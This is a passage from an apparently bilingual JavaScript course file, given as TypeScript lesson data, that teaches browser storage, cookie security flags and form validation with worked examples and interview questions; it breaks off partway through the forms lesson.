/**
 * JavaScript Complete Course — Module 4: The Browser and the Network (2 of 2).
 *
 * Storage, forms and security. The security lesson is deliberately last: it only
 * makes sense once you have seen innerHTML, fetch and form handling, because
 * every hole it describes is opened by misusing one of those three.
 *
 * Same writing rules as Module 1:
 *   1. Open with something from real life, not from programming.
 *   2. One idea per entry. If it needs two, it needs two lessons.
 *   3. No word the reader has not met yet, unless you define it in the sentence.
 *   4. Every example shows its output. Never make the reader guess.
 */

import type { CourseLesson } from './course-js-module1';

export const JS_MODULE_4_PART2: CourseLesson[] = [
  /* ══════════════════════ Storage ══════════════════════ */
  {
    slug: 'browser-storage',
    title: 'Storage — localStorage, sessionStorage and Cookies',
    titleHi: 'Storage — localStorage, sessionStorage aur Cookies',
    description: 'Three drawers with different rules about what survives, and what gets posted to the server.',
    descriptionHi: 'Teen daraaz, alag-alag niyam — kya bachta hai, aur kya server tak pahunch jata hai.',
    difficulty: 'EASY',
    duration: 30,
    order: 4,

    analogy: {
      en: '**Three drawers in your desk.** The bottom drawer keeps things until you deliberately clear it out — that is **localStorage**. The top drawer is emptied by the cleaner every night — that is **sessionStorage**. And the third is not really a drawer at all: it is a note stapled to every letter you post to the shop, so the shop reads it whether you meant them to or not. That is a **cookie**.',
      hi: '**Aapki mez ke teen daraaz.** Sabse neeche wala tab tak sab rakhta hai jab tak aap khud saaf na karo — wo **localStorage** hai. Sabse upar wala roz raat ko safaiwala khaali kar deta hai — wo **sessionStorage** hai. Aur teesra daraaz hai hi nahi: wo ek parcha hai jo aapke dukaan bheje har khat par chipka hota hai, isliye dukaan usse padhti hai chahe aap chaho ya na chaho. Wo **cookie** hai.',
    },

    simple: `**Three places to keep something in a browser.**

**localStorage — survives everything**

\`\`\`js
localStorage.setItem('theme', 'dark');
localStorage.getItem('theme');      // 'dark'
localStorage.removeItem('theme');
localStorage.clear();               // wipe it all
\`\`\`

Closed the tab? Rebooted the machine? Still there. It stays until code deletes it or the user clears their browser data.

**sessionStorage — dies with the tab**

Same four methods, same API. The only difference is lifetime: close the tab and it is gone. Even a second tab on the same site gets its own separate copy.

**It only stores strings**

This is the part that surprises people:

\`\`\`js
localStorage.setItem('user', { name: 'Jay' });
localStorage.getItem('user');       // '[object Object]'  😱
\`\`\`

Your object was converted to a useless string. You must serialise it yourself:

\`\`\`js
localStorage.setItem('user', JSON.stringify({ name: 'Jay' }));
const user = JSON.parse(localStorage.getItem('user'));
\`\`\`

And since it is JSON, everything from the JSON lesson applies — your Dates come back as strings.

**Cookies — the one the server sees**

localStorage never leaves the browser. A cookie is **automatically attached to every request** to that site.

That is the entire difference, and it decides which one you use:

- Something only the page needs → **localStorage**
- Something the *server* needs to see on every request → **cookie**

**Where to keep a login token**

Short answer: **an \`httpOnly\` cookie**, set by the server. \`httpOnly\` means JavaScript cannot read it at all — so a single XSS bug cannot steal it.

A token in localStorage is readable by any script on your page, including one an attacker injected. That is why "store the JWT in localStorage" is such a contested piece of advice.

**Remember:** it only stores strings, always wrap reads in try/catch, and never put a secret where JavaScript can read it.`,

    simpleHi: `**Browser mein kuch rakhne ki teen jagah.**

**localStorage — sab kuch jhel jata hai**

\`\`\`js
localStorage.setItem('theme', 'dark');
localStorage.getItem('theme');      // 'dark'
localStorage.removeItem('theme');
localStorage.clear();               // sab mita do
\`\`\`

Tab band kiya? Machine reboot ki? Phir bhi wahin hai. Jab tak code na mitaye ya user browser data clear na kare, wo rehta hai.

**sessionStorage — tab ke saath khatam**

Wahi chaar methods, wahi API. Fark sirf umar ka hai: tab band karo aur gaya. Usi site ka doosra tab bhi apni alag copy rakhta hai.

**Ye sirf strings rakhta hai**

Yahi hissa logon ko chaunkata hai:

\`\`\`js
localStorage.setItem('user', { name: 'Jay' });
localStorage.getItem('user');       // '[object Object]'  😱
\`\`\`

Aapka object bekaar string ban gaya. Aapko khud serialise karna padta hai:

\`\`\`js
localStorage.setItem('user', JSON.stringify({ name: 'Jay' }));
const user = JSON.parse(localStorage.getItem('user'));
\`\`\`

Aur chunki ye JSON hai, JSON wale sabak ki har baat yahan lagti hai — aapki Dates strings bankar wapas aati hain.

**Cookies — jo server ko dikhta hai**

localStorage kabhi browser se bahar nahi jata. Cookie us site ki **har request ke saath apne aap chipak jati hai**.

Bas yahi poora fark hai, aur isi se tay hota hai ki kya use karein:

- Jo sirf page ko chahiye → **localStorage**
- Jo *server* ko har request par dekhna hai → **cookie**

**Login token kahan rakhein**

Chhota jawab: **\`httpOnly\` cookie**, jo server set kare. \`httpOnly\` matlab JavaScript usse padh hi nahi sakta — isliye ek XSS bug usse chura nahi sakta.

localStorage mein rakha token aapke page ke har script ko dikhta hai, us script ko bhi jo hamlavar ne daala ho. Isiliye "JWT localStorage mein rakho" itni vivadit salah hai.

**Yaad rakho:** ye sirf strings rakhta hai, reads ko hamesha try/catch mein rakho, aur koi raaz wahan mat rakho jahan JavaScript padh sake.`,

    content: `## Choosing between them

| | localStorage | sessionStorage | Cookie |
|---|---|---|---|
| Survives tab close | ✅ | ❌ | ✅ (if it has an expiry) |
| Shared across tabs | ✅ | ❌ | ✅ |
| Sent to the server | ❌ | ❌ | ✅ **every request** |
| Size limit | ~5–10 MB | ~5–10 MB | **~4 KB** |
| Readable by JS | ✅ | ✅ | only if not \`httpOnly\` |

That 4 KB cookie limit is small on purpose — every byte is uploaded on every single request, including images and stylesheets.

## Always guard reads

\`\`\`js
function read(key, fallback = null) {
  try {
    const raw = localStorage.getItem(key);
    return raw === null ? fallback : JSON.parse(raw);
  } catch {
    return fallback;   // corrupt JSON, or storage disabled
  }
}
\`\`\`

Two separate failures are possible: the stored string may not be valid JSON, and \`localStorage\` itself can throw — Safari private mode historically threw on **write**, and some privacy settings block access entirely.

## Quota

\`\`\`js
try {
  localStorage.setItem('big', hugeString);
} catch (err) {
  if (err.name === 'QuotaExceededError') { /* evict something */ }
}
\`\`\`

## Cookies from JavaScript

\`document.cookie\` is a famously awkward API — reading gives you one long string of every cookie, and writing sets only one at a time:

\`\`\`js
document.cookie = 'theme=dark; path=/; max-age=31536000; SameSite=Lax';
\`\`\`

The flags are the important part:

- \`httpOnly\` — JS cannot read it (**set by the server only**)
- \`Secure\` — HTTPS only
- \`SameSite=Lax|Strict\` — not sent on cross-site requests, which blocks CSRF
- \`max-age\` / \`expires\` — without one it dies when the browser closes

## Reacting to changes in another tab

\`\`\`js
window.addEventListener('storage', (e) => {
  console.log(e.key, e.oldValue, '→', e.newValue);
});
\`\`\`

This fires in *other* tabs, never the one that made the change — which is exactly how "you were logged out in another tab" works.

## When to use IndexedDB instead

localStorage is **synchronous**, so a large read blocks the main thread and freezes the page. For anything beyond a few hundred kilobytes, or for structured queryable data, use IndexedDB (or a small wrapper like \`idb\`).`,

    contentHi: `## Kaunsa chunein

| | localStorage | sessionStorage | Cookie |
|---|---|---|---|
| Tab band hone par bachta hai | ✅ | ❌ | ✅ (agar expiry ho) |
| Tabs mein saanjha | ✅ | ❌ | ✅ |
| Server tak jata hai | ❌ | ❌ | ✅ **har request** |
| Size limit | ~5–10 MB | ~5–10 MB | **~4 KB** |
| JS padh sakta hai | ✅ | ✅ | sirf tab jab \`httpOnly\` na ho |

Wo 4 KB ki cookie limit jaan-boojhkar chhoti hai — har byte har ek request ke saath upload hota hai, images aur stylesheets ke saath bhi.

## Reads par hamesha guard lagao

\`\`\`js
function read(key, fallback = null) {
  try {
    const raw = localStorage.getItem(key);
    return raw === null ? fallback : JSON.parse(raw);
  } catch {
    return fallback;   // kharab JSON, ya storage band hai
  }
}
\`\`\`

Do alag failures ho sakti hain: store ki gayi string valid JSON na ho, aur khud \`localStorage\` throw kar sakta hai — Safari private mode pehle **write** par throw karta tha, aur kuch privacy settings pahunch hi rok deti hain.

## Quota

\`\`\`js
try {
  localStorage.setItem('big', hugeString);
} catch (err) {
  if (err.name === 'QuotaExceededError') { /* kuch hatao */ }
}
\`\`\`

## JavaScript se cookies

\`document.cookie\` mashhoor tarike se ajeeb API hai — padhne par saari cookies ki ek lambi string milti hai, aur likhne par ek baar mein ek hi set hoti hai:

\`\`\`js
document.cookie = 'theme=dark; path=/; max-age=31536000; SameSite=Lax';
\`\`\`

Flags hi asli baat hain:

- \`httpOnly\` — JS padh nahi sakta (**sirf server set karta hai**)
- \`Secure\` — sirf HTTPS par
- \`SameSite=Lax|Strict\` — cross-site requests par nahi jati, jisse CSRF rukta hai
- \`max-age\` / \`expires\` — na ho to browser band hote hi khatam

## Doosre tab ke badlav par react karna

\`\`\`js
window.addEventListener('storage', (e) => {
  console.log(e.key, e.oldValue, '→', e.newValue);
});
\`\`\`

Ye *doosre* tabs mein chalta hai, us tab mein kabhi nahi jisne badlav kiya — aur "aap doosre tab mein logout ho gaye" bilkul isi tarah kaam karta hai.

## IndexedDB kab use karein

localStorage **synchronous** hai, isliye bada read main thread rok deta hai aur page freeze ho jata hai. Kuch sau kilobyte se zyada ke liye, ya structured queryable data ke liye, IndexedDB use karo (ya \`idb\` jaisa chhota wrapper).`,

    examples: [
      {
        title: 'The basics',
        titleHi: 'Basics',
        code: `localStorage.setItem('theme', 'dark');
console.log(localStorage.getItem('theme'));

console.log(localStorage.getItem('missing'));

localStorage.removeItem('theme');
console.log(localStorage.getItem('theme'));

console.log('items stored:', localStorage.length);`,
        output: `dark
null
null
items stored: 0`,
        explain: 'A missing key returns `null`, not `undefined`. That matters when you write `?? defaultValue`, because both are covered by `??`.',
        explainHi: 'Jo key nahi hai wo `null` deti hai, `undefined` nahi. `?? defaultValue` likhte waqt ye zaroori hai, kyunki `??` dono ko cover karta hai.',
      },
      {
        title: 'It only stores strings',
        titleHi: 'Ye sirf strings rakhta hai',
        code: `localStorage.setItem('user', { name: 'Jay' });
console.log(localStorage.getItem('user'));

localStorage.setItem('count', 42);
console.log(typeof localStorage.getItem('count'));

localStorage.setItem('ok', true);
console.log(localStorage.getItem('ok') === true);`,
        output: `[object Object]
string
false`,
        explain: 'Everything is coerced to a string on the way in. The last line is a real bug source: `"true" === true` is false, so a naive boolean check silently fails.',
        explainHi: 'Andar jaate waqt sab kuch string ban jata hai. Aakhri line asli bug ka source hai: `"true" === true` false hai, isliye seedha boolean check chup-chaap fail ho jata hai.',
      },
      {
        title: 'Storing objects properly',
        titleHi: 'Objects theek se rakhna',
        code: `const user = { name: 'Jay', joined: new Date('2024-01-15') };

localStorage.setItem('user', JSON.stringify(user));

const back = JSON.parse(localStorage.getItem('user'));
console.log(back.name);
console.log(typeof back.joined);
console.log(back.joined instanceof Date);`,
        output: `Jay
string
false`,
        explain: 'Round-tripping through localStorage is a JSON round trip, so the Date came back as a string. Everything from the JSON lesson applies here, including using a reviver to rebuild it.',
        explainHi: 'localStorage se aana-jana ek JSON round trip hi hai, isliye Date string bankar aayi. JSON wale sabak ki har baat yahan lagti hai, reviver se usse wapas banane ki baat bhi.',
      },
      {
        title: 'A safe read helper',
        titleHi: 'Safe read helper',
        code: `function read(key, fallback = null) {
  try {
    const raw = localStorage.getItem(key);
    return raw === null ? fallback : JSON.parse(raw);
  } catch {
    return fallback;
  }
}

localStorage.setItem('good', JSON.stringify({ a: 1 }));
localStorage.setItem('corrupt', 'not json at all');

console.log(read('good'));
console.log(read('corrupt', { a: 0 }));
console.log(read('never-set', 'default'));`,
        output: `{ a: 1 }
{ a: 0 }
default`,
        explain: 'Corrupt data is normal — an older version of your app may have written a different shape. A bare `JSON.parse(getItem(...))` throws and takes the whole page down on load.',
        explainHi: 'Kharab data aam baat hai — aapke app ka purana version alag shape likh gaya ho sakta hai. Seedha `JSON.parse(getItem(...))` throw karta hai aur load par poora page gira deta hai.',
      },
      {
        title: 'localStorage versus sessionStorage',
        titleHi: 'localStorage versus sessionStorage',
        code: `localStorage.setItem('persistent', 'I survive a reboot');
sessionStorage.setItem('temporary', 'I die with this tab');

console.log(localStorage.getItem('persistent'));
console.log(sessionStorage.getItem('temporary'));

// After closing and reopening the tab:
// localStorage.getItem('persistent')  → 'I survive a reboot'
// sessionStorage.getItem('temporary') → null
console.log('same API, different lifetime');`,
        output: `I survive a reboot
I die with this tab
same API, different lifetime`,
        explain: 'Identical methods, one difference: lifetime. Use sessionStorage for things that should not leak between tabs — a multi-step form in progress, for example.',
        explainHi: 'Bilkul ek jaise methods, ek fark: umar. Un cheezon ke liye sessionStorage use karo jo tabs ke beech nahi jani chahiye — jaise beech mein chhoda hua multi-step form.',
      },
      {
        title: 'Handling the quota',
        titleHi: 'Quota sambhalna',
        code: `try {
  const huge = 'x'.repeat(10 * 1024 * 1024);   // ~10 MB
  localStorage.setItem('huge', huge);
  console.log('stored');
} catch (err) {
  console.log('Failed:', err.name);
  console.log('Storage is roughly 5 MB per origin');
}`,
        output: `Failed: QuotaExceededError
Storage is roughly 5 MB per origin`,
        explain: 'Writes can fail, and an unguarded `setItem` throws in the middle of whatever you were doing. Cache-style code should catch this and evict older entries.',
        explainHi: 'Writes fail ho sakti hain, aur bina guard ka `setItem` aapke kaam ke beech mein hi throw kar deta hai. Cache jaisa code isse catch karke purani entries hataye.',
      },
      {
        title: 'Reading and writing cookies',
        titleHi: 'Cookies padhna aur likhna',
        code: `document.cookie = 'theme=dark; path=/; max-age=3600; SameSite=Lax';
document.cookie = 'lang=en; path=/; max-age=3600; SameSite=Lax';

console.log(document.cookie);

function getCookie(name) {
  return document.cookie
    .split('; ')
    .find(c => c.startsWith(name + '='))
    ?.split('=')[1];
}

console.log(getCookie('theme'));
console.log(getCookie('missing'));`,
        output: `theme=dark; lang=en
dark
undefined`,
        explain: 'Reading gives you every cookie as one string, so you always end up writing a helper. Note that assigning to `document.cookie` adds one rather than replacing them all.',
        explainHi: 'Padhne par saari cookies ek string mein milti hain, isliye helper likhna hi padta hai. Dhyan do `document.cookie` par assign karna ek jodta hai, sabko replace nahi karta.',
      },
      {
        title: 'Why httpOnly matters',
        titleHi: 'httpOnly kyun zaroori hai',
        code: `// Set by the server: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
console.log('httpOnly cookie visible to JS?', document.cookie.includes('session'));

localStorage.setItem('token', 'eyJhbGci...');
console.log('localStorage token visible to JS?', Boolean(localStorage.getItem('token')));

console.log('An injected script can read the second one, not the first.');`,
        output: `httpOnly cookie visible to JS? false
localStorage token visible to JS? true
An injected script can read the second one, not the first.`,
        explain: 'The httpOnly cookie is invisible to JavaScript but still sent with every request — the server gets it, an attacker\'s script does not. That is the entire argument for storing session tokens there.',
        explainHi: 'httpOnly cookie JavaScript ko dikhti hi nahi par har request ke saath jati hai — server ko milti hai, hamlavar ke script ko nahi. Session tokens wahan rakhne ki poori dalil yahi hai.',
      },
      {
        title: 'Syncing across tabs',
        titleHi: 'Tabs ke beech sync',
        code: `window.addEventListener('storage', (e) => {
  console.log('another tab changed', e.key);
  console.log('  from:', e.oldValue, 'to:', e.newValue);
  if (e.key === 'token' && e.newValue === null) {
    console.log('  → logged out elsewhere, redirecting');
  }
});

// In THIS tab this fires nothing — only other tabs hear it.
localStorage.setItem('theme', 'light');
console.log('this tab set theme; no event fired here');`,
        output: `this tab set theme; no event fired here`,
        explain: 'The event deliberately does not fire in the tab that made the change — you already know about your own write. This is how "logged out in another tab" propagates instantly.',
        explainHi: 'Event jaan-boojhkar us tab mein nahi chalta jisne badlav kiya — apni write ka to aapko pata hai hi. "Doosre tab mein logout" isi tarah turant sab jagah pahunchta hai.',
      },
    ],

    mistakes: [
      {
        wrong: `localStorage.setItem('user', user);  // ❌ '[object Object]'`,
        right: `localStorage.setItem('user', JSON.stringify(user));  // ✅`,
        why: 'Storage holds strings only. Any object is coerced with `String()`, which produces "[object Object]".',
        whyHi: 'Storage sirf strings rakhta hai. Koi bhi object `String()` se badal jata hai, jo "[object Object]" banata hai.',
      },
      {
        wrong: `const u = JSON.parse(localStorage.getItem('user'));  // ❌ throws on null or corrupt data`,
        right: `let u = null;\ntry { u = JSON.parse(localStorage.getItem('user') ?? 'null'); } catch {}  // ✅`,
        why: '`JSON.parse(null)` happens to give null, but any corrupt leftover string throws and can break your app on startup.',
        whyHi: '`JSON.parse(null)` ittefaq se null deta hai, par bachi hui koi bhi kharab string throw karti hai aur app ko startup par toad sakti hai.',
      },
      {
        wrong: `localStorage.setItem('jwt', token);  // ❌ any injected script can read it`,
        right: `// server: Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax  ✅`,
        why: 'A token in localStorage is readable by every script on the page. An httpOnly cookie is not readable by JavaScript at all, so XSS cannot exfiltrate it.',
        whyHi: 'localStorage ka token page ke har script ko dikhta hai. httpOnly cookie JavaScript ko dikhti hi nahi, isliye XSS usse chura nahi sakta.',
      },
      {
        wrong: `if (localStorage.getItem('isAdmin') === 'true') showAdminPanel();  // ❌`,
        right: `// ask the server; it decides, not the browser  ✅`,
        why: 'The user can edit localStorage in devtools in two seconds. Never let client-side storage decide permissions.',
        whyHi: 'User devtools mein do second mein localStorage badal sakta hai. Permissions ka faisla kabhi client-side storage par mat chhodo.',
      },
    ],

    realWorld: [
      {
        en: '**Theme and preferences.** Dark mode, language and sidebar-collapsed state are the textbook localStorage use — small, non-secret, and needed before the first render.',
        hi: '**Theme aur preferences.** Dark mode, bhasha aur sidebar-collapsed state localStorage ka kitabi istemaal hai — chhota, gupt nahi, aur pehle render se pehle chahiye.',
      },
      {
        en: '**Draft recovery.** Saving a half-written comment on every keystroke (debounced) means a refresh does not lose the user\'s work.',
        hi: '**Draft bachana.** Aadha likha comment har keystroke par (debounced) save karne se refresh par user ka kaam nahi jata.',
      },
      {
        en: '**Cross-tab logout.** The `storage` event lets every open tab react the instant the token is cleared in one of them.',
        hi: '**Cross-tab logout.** `storage` event har khule tab ko usi pal react karne deta hai jab kisi ek mein token clear hota hai.',
      },
    ],

    interviewQA: [
      {
        q: 'What is the difference between localStorage, sessionStorage and cookies?',
        qHi: 'localStorage, sessionStorage aur cookies mein kya fark hai?',
        a: 'localStorage persists until explicitly cleared and is shared across tabs of the same origin. sessionStorage is scoped to a single tab and dies when it closes. Cookies are the only one sent to the server on every request, are limited to about 4 KB, and can be made unreadable to JavaScript with the `httpOnly` flag.',
        aHi: 'localStorage tab tak rehta hai jab tak jaan-boojhkar na mitaya jaye aur usi origin ke saare tabs mein saanjha hota hai. sessionStorage ek hi tab tak seemit hai aur band hote hi khatam. Cookies hi ekmatra hain jo har request ke saath server tak jati hain, lagbhag 4 KB tak seemit hain, aur `httpOnly` flag se JavaScript ke liye adrishya banayi ja sakti hain.',
      },
      {
        q: 'Why does storing an object in localStorage not work directly?',
        qHi: 'localStorage mein object seedhe kyun nahi rakh sakte?',
        a: 'The Web Storage API stores strings only, so any non-string value is coerced with `String()` — an object becomes the literal text "[object Object]". You must call `JSON.stringify` on write and `JSON.parse` on read, which also means all the usual JSON limitations apply.',
        aHi: 'Web Storage API sirf strings rakhta hai, isliye har non-string value `String()` se badal jati hai — object literal text "[object Object]" ban jata hai. Likhte waqt `JSON.stringify` aur padhte waqt `JSON.parse` karna padta hai, jiska matlab JSON ki saari seemaayein bhi lagti hain.',
      },
      {
        q: 'Where should a JWT be stored, and why?',
        qHi: 'JWT kahan rakhni chahiye, aur kyun?',
        a: 'Preferably in an `httpOnly`, `Secure`, `SameSite` cookie set by the server. JavaScript cannot read it, so an XSS vulnerability cannot exfiltrate it, and `SameSite` mitigates CSRF. localStorage is readable by any script on the page, which means one injected script is enough to steal the session.',
        aHi: 'Behtar hai server dwara set ki gayi `httpOnly`, `Secure`, `SameSite` cookie mein. JavaScript usse padh nahi sakta, isliye XSS usse chura nahi sakta, aur `SameSite` CSRF kam karta hai. localStorage page ke har script ko dikhta hai, matlab ek daala hua script hi session churane ke liye kaafi hai.',
      },
      {
        q: 'What is the `storage` event and where does it fire?',
        qHi: '`storage` event kya hai aur kahan chalta hai?',
        a: 'It fires on `window` when localStorage or sessionStorage is modified — but only in *other* tabs of the same origin, never the tab that made the change. It carries `key`, `oldValue` and `newValue`, which makes it the standard way to synchronise state such as logout across tabs.',
        aHi: 'Wo `window` par tab chalta hai jab localStorage ya sessionStorage badalta hai — par sirf usi origin ke *doosre* tabs mein, us tab mein kabhi nahi jisne badlav kiya. Usme `key`, `oldValue` aur `newValue` hote hain, isliye tabs ke beech logout jaisi state sync karne ka yahi standard tarika hai.',
      },
      {
        q: 'When would you use IndexedDB instead of localStorage?',
        qHi: 'localStorage ke bajaye IndexedDB kab use karoge?',
        a: 'When the data is larger than a few hundred kilobytes, needs to be queried or indexed, or must not block the UI. localStorage is synchronous, so a large read or write stalls the main thread. IndexedDB is asynchronous, effectively unlimited, and stores structured values without serialising to a string.',
        aHi: 'Jab data kuch sau kilobyte se bada ho, usse query ya index karna ho, ya UI block nahi hona chahiye. localStorage synchronous hai, isliye bada read ya write main thread rok deta hai. IndexedDB asynchronous hai, lagbhag aseemit hai, aur structured values ko bina string banaye rakhta hai.',
      },
    ],

    exercises: [
      {
        task: 'Write `storage.get(key, fallback)` and `storage.set(key, value)` that handle JSON automatically and never throw, whatever is already stored.',
        taskHi: '`storage.get(key, fallback)` aur `storage.set(key, value)` likho jo JSON apne aap sambhalein aur kabhi throw na karein, chahe pehle se kuch bhi stored ho.',
        hint: 'Wrap both in try/catch. `get` must handle a missing key AND unparseable data; `set` must handle QuotaExceededError.',
        hintHi: 'Dono ko try/catch mein rakho. `get` ko missing key AUR na-parse hone wala data dono sambhalna hai; `set` ko QuotaExceededError.',
      },
      {
        task: 'Build a theme toggle that saves the choice to localStorage and restores it on page load, before the first paint so there is no flash of the wrong theme.',
        taskHi: 'Aisa theme toggle banao jo choice localStorage mein save kare aur page load par wapas laaye — pehle paint se pehle, taaki galat theme ki jhalak na dikhe.',
        hint: 'Read the value in a small inline script in `<head>` and set a class on `<html>` there. Reading it after the app mounts is already too late.',
        hintHi: '`<head>` mein chhote inline script se value padho aur wahin `<html>` par class lagao. App mount hone ke baad padhna pehle hi der ho chuki hoti hai.',
      },
      {
        task: 'Build a comment box that saves a draft to localStorage as the user types (debounced 500ms), restores it on reload, and clears it on submit.',
        taskHi: 'Aisa comment box banao jo type karte waqt draft localStorage mein save kare (500ms debounce), reload par wapas laaye, aur submit par clear kar de.',
        hint: 'Debounce so you are not writing on every keystroke — localStorage is synchronous and writing constantly will make typing feel laggy.',
        hintHi: 'Debounce karo taaki har keystroke par na likho — localStorage synchronous hai aur lagatar likhne se typing atakti mehsoos hogi.',
      },
    ],

    keyTakeaways: [
      'localStorage survives everything; sessionStorage dies with the tab; cookies go to the server.',
      'Storage holds strings only — `JSON.stringify` on write, `JSON.parse` on read.',
      'Always wrap reads in try/catch: stored data may be corrupt and storage may be blocked.',
      'Cookies are ~4 KB and uploaded on every request, so keep them tiny.',
      'Session tokens belong in an `httpOnly` cookie, not localStorage — XSS cannot read httpOnly.',
      'Never let client storage decide permissions; the user can edit it freely.',
    ],
    keyTakeawaysHi: [
      'localStorage sab jhel jata hai; sessionStorage tab ke saath khatam; cookies server tak jati hain.',
      'Storage sirf strings rakhta hai — likhte waqt `JSON.stringify`, padhte waqt `JSON.parse`.',
      'Reads ko hamesha try/catch mein rakho: data kharab ho sakta hai aur storage band bhi ho sakta hai.',
      'Cookies ~4 KB ki hain aur har request par upload hoti hain, isliye unhe chhota rakho.',
      'Session tokens `httpOnly` cookie mein rakho, localStorage mein nahi — XSS httpOnly padh nahi sakta.',
      'Permissions ka faisla kabhi client storage par mat chhodo; user usse aaram se badal sakta hai.',
    ],
  },

  /* ══════════════════════ Forms & Validation ══════════════════════ */
  {
    slug: 'forms-and-validation',
    title: 'Forms and Validation',
    titleHi: 'Forms aur Validation',
    description: 'The gate guard is polite; the lock is what actually stops anyone.',
    descriptionHi: 'Gate ka guard sirf vinamr hai; rokta asal mein taala hai.',
    difficulty: 'MEDIUM',
    duration: 32,
    order: 5,

    analogy: {
      en: '**A polite gate guard and a real lock.** The guard at the gate says "sorry, that form is incomplete" and saves you a wasted trip — that is client-side validation. But anyone can walk around the gate. The lock on the actual door is the server. Client validation is *courtesy*; server validation is *security*. You need both, and only one of them is optional to skip in a demo.',
      hi: '**Vinamr gate guard aur asli taala.** Gate ka guard kehta hai "maaf kijiye, form adhoora hai" aur aapka chakkar bacha leta hai — wo client-side validation hai. Par gate ke bagal se koi bhi ghoom kar aa sakta hai. Asli darwaze ka taala server hai. Client validation *shishtachar* hai; server validation *suraksha*. Dono chahiye, aur demo mein sirf ek hi chhoda ja sakta hai.',
    },

    simple: `**Reading a form**

\`\`\`js
form.addEventListener('submit', (e) => {
  e.preventDefault();                              // stop the page reloading
  const data = Object.fromEntries(new FormData(form));
  console.log(data);   // { email: 'jay@x.com', password: '...' }
});
\`\`\`

Two things to notice. \`preventDefault\` is mandatory — without it the browser reloads and your code never finishes. And \`FormData\` reads every field that has a **\`name\`** attribute. No \`name\`, no data. That is the number one "why is my field missing?" cause.

**The browser validates for free**

\`\`\`html
<input type="email" name="email" required>
<input type="password" name="password" minlength="8" required>
<input type="number" name="age" min="18" max="120">
\`\`\`

You get the checks, the error messages, the focus handling and the accessibility for nothing. Always start here before writing any JavaScript.

**Checking it from JavaScript**

\`\`\`js
input.validity.valid;        // does it pass?
input.validity.tooShort;     // which rule failed?
input.validationMessage;     // the browser's message text
form.checkValidity();        // is the whole form valid?
\`\`\`

**Custom rules**

\`\`\`js
confirmPassword.setCustomValidity(
  confirmPassword.value === password.value ? '' : 'Passwords do not match'
);
\`\`\`

An empty string means valid. Any other string marks the field invalid and becomes its message. **Remember to clear it** — a stale custom message keeps the field invalid forever.

**Validate at the right moment**

Showing "invalid email" while someone is still typing the first letter is hostile. The rule that feels right:

- **on \`blur\`** — first check, when they leave the field
- **on \`input\`** — only *after* it has already failed once, so they see it turn green as they fix it

**And now the important part**

\`\`\`js
// The user can delete your validation in devtools in five seconds:
document.querySelector('form').noValidate = true;
// Or skip the page entirely:
fetch('/api/users', { method: 'POST', body: '{"age": -5}' });
\`\`\`

Client validation is a **user experience feature**. It is not a security control. Every rule you enforce in the browser must be enforced again on the server, because the browser is entirely under the user's control.

**Remember:** the browser validates for UX. The server validates for real.`,

    simpleHi: `**Form padhna**

\`\`\`js
form.addEventListener('submit', (e) => {
  e.preventDefault();                              // page reload roko
  const data = Object.fromEntries(new FormData(form));
  console.log(data);   // { email: 'jay@x.com', password: '...' }
});
\`\`\`

Do baatein dhyan do. \`preventDefault\` zaroori hai — uske bina browser reload kar deta hai aur aapka code poora hota hi nahi. Aur \`FormData\` sirf un fields ko padhta hai jinme **\`name\`** attribute ho. \`name\` nahi to data nahi. "Meri field kyun gayab hai?" ka number one kaaran yahi hai.

**Browser muft mein validate karta hai**

\`\`\`html
<input type="email" name="email" required>
<input type="password" name="password" minlength="8" required>
<input type="number" name="age" min="18" max="120">
\`\`\`

Aapko checks, error messages, focus handling aur accessibility sab muft mein mil jate hain. Koi bhi JavaScript likhne se pehle hamesha yahin se shuru karo.

**JavaScript se check karna**

\`\`\`js
input.validity.valid;        // paas hua?
input.validity.tooShort;     // kaunsa rule fail hua?
input.validationMessage;     // browser ka message
form.checkValidity();        // poora form valid hai?
\`\`\`

**Apne rules**

\`\`\`js
confirmPassword.setCustomValidity(
  confirmPassword.value === password.value ? '' : 'Passwords match nahi karte'
);
\`\`\`

Khaali string matlab valid. Koi bhi doosri string field ko invalid kar deti hai aur wahi uska message ban jati hai. **Usse clear karna mat bhoolo** — purana custom message field ko hamesha ke liye invalid rakh deta hai.

**Sahi waqt par validate karo**

Jab koi pehla akshar hi likh raha ho tab "invalid email" dikhana rukha lagta hai. Jo niyam sahi lagta hai:

- **\`blur\` par** — pehla check, jab wo field chhodein
- **\`input\` par** — sirf ek baar fail ho chukne ke *baad*, taaki sudharte waqt use hara hota dikhe

**Ab asli baat**

\`\`\`js
// User devtools mein paanch second mein aapki validation mita sakta hai:
document.querySelector('form').noValidate = true;
// Ya page ko poori tarah chhod sakta hai:
fetch('/api/users', { method: 'POST', body: '{"age": -5}' });
\`\`\`

Client validation ek **user experience feature** hai. Wo security control nahi hai. Browser mein lagaya har rule server par dobara lagana hi padta hai, kyunki browser poori tarah user ke kabze mein hai.

**Yaad rakho:** browser UX ke liye validate karta hai. Server sach mein validate karta hai.`,

    content: `## Reading fields

\`\`\`js
new FormData(form)                       // all named fields
Object.fromEntries(new FormData(form))   // → a plain object
form.elements.email.value                // one field by name
formData.getAll('tags')                  // multiple values, same name
\`\`\`

\`Object.fromEntries\` **loses duplicates** — with three checkboxes all named \`tags\`, you get only the last. Use \`getAll\` for those.

## Input types worth using

\`\`\`html
<input type="email">     validates the shape, shows an @ keyboard on mobile
<input type="tel">       numeric keypad on mobile
<input type="number">    min / max / step
<input type="url">       requires a scheme
<input type="date">      a native date picker
\`\`\`

The mobile keyboard difference alone is worth getting right.

## The ValidityState object

\`\`\`js
input.validity.valueMissing   // required but empty
input.validity.typeMismatch   // not a valid email/url
input.validity.tooShort       // below minlength
input.validity.rangeUnderflow // below min
input.validity.patternMismatch// failed the pattern attribute
input.validity.customError    // set via setCustomValidity
\`\`\`

Branching on these lets you write a better message than the browser's default.

## Styling validity

\`\`\`css
input:invalid { border-color: red; }          /* fires while typing — harsh */
input:user-invalid { border-color: red; }     /* only after interaction — better */
\`\`\`

\`:user-invalid\` is the modern answer to "my empty form is red before anyone touched it".

## A sensible validation flow

\`\`\`js
const touched = new Set();

form.addEventListener('blur', (e) => {
  touched.add(e.target.name);
  showError(e.target);
}, true);                              // capture — blur does not bubble

form.addEventListener('input', (e) => {
  if (touched.has(e.target.name)) showError(e.target);   // only re-check after first blur
});
\`\`\`

Note the \`true\` third argument: \`blur\` does not bubble, so delegation needs the capture phase — or use \`focusout\`, which does bubble.

## Disabled versus readonly

\`\`\`html
<input disabled>   <!-- not submitted at all -->
